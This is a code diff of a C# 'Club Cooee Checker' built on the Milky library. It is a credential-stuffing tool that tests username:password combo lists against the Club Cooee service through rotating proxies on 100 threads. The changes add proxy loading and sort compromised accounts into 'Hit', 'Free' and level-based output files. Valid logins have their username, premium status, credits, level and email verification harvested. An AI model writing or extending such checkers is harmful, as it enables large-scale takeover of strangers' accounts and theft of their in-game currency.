@@ -1,4 +1,3 @@
-using Milky;
 using Milky.Enums;
 using Milky.Models;
 using System;
@@ -14,33 +13,23 @@ namespace Milky.Examples
     {
         public static async Task Main()
         {
-            var checkerSettings = new CheckerSettings(maxThreads: 100, useProxies: false);
-
-            var outputSettings = new OutputSettings()
-            {
-                OutputDirectory = "Results",
-                OutputInvalids = false,
-                CaptureSeparator = " | ",
-                HitColor = ConsoleColor.Green,
-                FreeColor = ConsoleColor.Cyan,
-                InvalidColor = ConsoleColor.Red
-            };
+            var checkerSettings = new CheckerSettings(100, true);
 
             var checker = new CheckerBuilder(checkerSettings, CheckAsync)
-                .WithOutputSettings(outputSettings)
-                .WithCombos(File.ReadAllLines("combos.txt"))
+                .WithCombos(File.ReadAllLines("Combos.txt"))
+                .WithProxies(File.ReadAllLines("Proxies.txt"), new ProxySettings(ProxyProtocol.HTTP))
                 .Build();
 
             var consoleManager = new ConsoleManager(checker);
-            _ = consoleManager.StartUpdatingTitleAsync(updateInterval: TimeSpan.FromMilliseconds(25), showFree: true, showPercentages: true, prefix: "Club Cooee Checker — ", suffix: null);
-            _ = consoleManager.StartListeningKeysAsync(pauseKey: ConsoleKey.P, resumeKey: ConsoleKey.R, endKey: null);
+            _ = consoleManager.StartUpdatingTitleAsync(TimeSpan.FromMilliseconds(25), prefix: "Club Cooee Checker — ");
+            _ = consoleManager.StartListeningKeysAsync(ConsoleKey.P, ConsoleKey.R);
 
             await checker.StartAsync();
 
             await Task.Delay(-1);
         }
 
-        private static async Task<CheckResult> CheckAsync(Combo combo, HttpClient httpClient)
+        private static async Task<CheckResult> CheckAsync(Combo combo, HttpClient httpClient, int attempts)
         {
             try
             {
@@ -60,20 +49,38 @@ namespace Milky.Examples
 
                 JsonElement user = responseJson.GetProperty("msg").GetProperty("userdata").GetProperty("auth");
 
+                bool vip = user.GetProperty("premium").GetBoolean();
+                int level = user.GetProperty("xp_level").GetInt32();
+
                 var captures = new Dictionary<string, object>()
                 {
                     { "Username", user.GetProperty("name").GetString() },
-                    { "VIP", user.GetProperty("premium").GetBoolean() },
+                    { "VIP", vip },
                     { "Cash", user.GetProperty("credits").GetString() },
-                    { "Level", user.GetProperty("xp_level").GetInt32() },
+                    { "Level", level },
                     { "Verified", user.GetProperty("email_confirmed").GetBoolean() }
                 };
 
-                return new CheckResult((bool)captures["VIP"] ? ComboResult.Hit : ComboResult.Free, captures);
+                var outputFiles = new List<string>() { vip ? "Hit" : "Free" };
+
+                if (level >= 10)
+                {
+                    outputFiles.Add(Path.Combine("Level", level switch
+                    {
+                        _ when level >= 100 => "100+",
+                        _ when level >= 50 => "50-99",
+                        _ when level >= 10 => "10-49"
+                    }));
+                }
+
+                return new CheckResult(vip ? ComboResult.Hit : ComboResult.Free, captures)
+                {
+                    OutputFiles = outputFiles
+                };
             }
             catch
             {
-                return new CheckResult(ComboResult.Retry);
+                return new CheckResult(ComboResult.Retry, false);
             }
         }
     }
